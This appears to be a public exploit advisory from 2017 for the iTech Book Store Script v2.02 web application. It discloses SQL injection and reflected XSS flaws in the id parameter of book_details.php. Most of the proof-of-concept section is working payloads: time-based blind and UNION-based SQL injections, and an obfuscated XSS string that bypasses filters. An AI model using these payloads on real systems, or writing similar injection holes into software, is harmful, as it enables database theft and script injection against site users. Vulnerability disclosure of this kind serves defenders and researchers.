@@ -1,0 +1,47 @@
+# Exploit Title: iTech Book Store Script v2.02 - SQL Injection / Reflected XSS
+# Date: 2017-09-11
+# Exploit Author: 8bitsec
+# Vendor Homepage: http://itechscripts.com/
+# Software Link: http://itechscripts.com/book-store-script
+# Version: 2.02
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-09-11
+
+Product & Service Introduction:
+===============================
+This is a robust platform for the booksellers and bookshop owners.
+
+Technical Details & Description:
+================================
+
+SQL injection on [id] parameter.
+
+Reflected XSS on [id] parameter
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+http://localhost/[path]/book_details.php?id=[SQLi]
+
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)-- uUqP
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: id=-7869 UNION ALL SELECT CONCAT(0x7170717071,0x546c4d4e535a5262584f446466626e67625656687561614b687764535a6c574a4b64454666564173,0x71766b7671)-- PYKD
+
+Reflected XSS:
+
+http://localhost/[path]/book_details.php?id=%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert(document.domain)//%3E\x3e
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
